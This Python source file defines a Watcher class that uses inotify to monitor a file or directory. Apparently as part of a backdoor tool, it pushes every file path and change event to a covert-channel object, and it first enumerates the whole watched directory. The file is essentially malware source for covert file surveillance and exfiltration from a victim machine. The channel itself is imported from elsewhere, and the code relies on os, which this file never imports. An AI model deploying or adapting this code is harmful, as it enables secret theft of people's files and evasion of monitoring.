import multiprocessing
import inotify.adapters
from covertChannel import *
from utils import check_exists, get_ip_address

class Watcher:
    def __init__(self):
        self.__status = False
        self.__is_file = False
        self.__is_dir = False
        self.__child = None

    def init_watcher(self):
        if not self.__status and not self.__is_file and not self.__is_dir:
            return True
        else:
            return False

    def toggle_file(self):
        self.__is_file = not self.__is_file

    def toggle_dir(self):
        self.__is_dir = not self.__is_dir

    def watching_dir_or_file(self):
        if self.__is_file:
            return False
        else:
            return True

    def toggle_status(self):
        self.__status = not self.__status

    def get_status(self):
        return self.__status

    def set_child(self, child):
        self.__child = child

    def join(self):
        self.__child.join()

    def get_curr_running(self):
        if self.__is_file:
            return 1
        elif self.__is_dir:
            return 2
        return -1

    def start_watching(self, covert_inst, path):
        self.__status = True
        if self.__is_file:
            watcher_process = multiprocessing.Process(target=self.watch_file, args=(covert_inst, path))
            print(f"WATCHER:: Watching file on {path}")
            watcher_process.start()
            self.toggle_file()
            self.__child = watcher_process
        elif self.__is_dir:
            watcher_process = multiprocessing.Process(target=self.watch_file, args=(covert_inst, path))
            print(f"WATCHER:: Watching Directory on {path}")
            watcher_process.start()
            self.toggle_dir()
            self.__child = watcher_process

    def watch_file(self, covert: CovertChannel, file_name):
        acceptable_events = ["IN_MOVE_SELF", "IN_MODIFY", "IN_MOVED_TO", "IN_MOVED_FROM", "IN_CREATE"]
        i = inotify.adapters.Inotify()
        i.add_watch(file_name)
        if not self.watching_dir_or_file():
            covert.file_name = file_name
            covert.send_data(for_victim=False, event="IN_MODIFY")
        else:
            covert.file_name = file_name
            covert.is_dir = True
            covert.send_data(for_victim=False, event="IN_MODIFY")

            covert.file_name = None
            covert.is_dir = False
            
            for filename in os.scandir(file_name):
                if filename.is_file():
                    covert.file_name = file_name + '/' + filename.name
                    covert.send_data(for_victim=False, event="IN_MODIFY")
                    covert.file_name = None
                elif filename.is_dir():
                    covert.file_name = file_name + '/' + filename.name
                    covert.is_dir = True
                    covert.send_data(for_victim=False, event="IN_MODIFY")
                    covert.file_name = None
                    covert.is_dir = False

        for event in i.event_gen(yield_nones=False):
            (_, type_names, path, filename) = event
            if ".part" in filename or ".kate-swp" in filename:
                continue
            if type_names[0] in acceptable_events:
                if self.watching_dir_or_file():
                    if "IN_ISDIR" in type_names:
                        covert.is_dir = True
                    else:
                        covert.is_dir = False
                    covert.file_name = path+'/'+filename
                    covert.send_data(for_victim=False, event=type_names[0])
                    covert.file_name = None
                    covert.is_dir = False
                elif not self.watching_dir_or_file():
                    covert.send_data(for_victim=False, event=type_names[0])

    def stop_watching(self):
        if self.__child is not None and self.__child.is_alive():
            self.__status = False
            if self.watching_dir_or_file():
                self.toggle_dir()
            else:
                self.toggle_file()
            self.__child.terminate()
            self.__child.join()
            print(f"WATCHER:: Watcher Process Stopped")
            self.__child = None
            return 0
        else:
            print(f"WATCHER:: Watcher process not running")
            return -1

    def __repr__(self):
        return f"Status:{self.__status}\tFile(0) or Dir(1):{self.watching_dir_or_file()}"
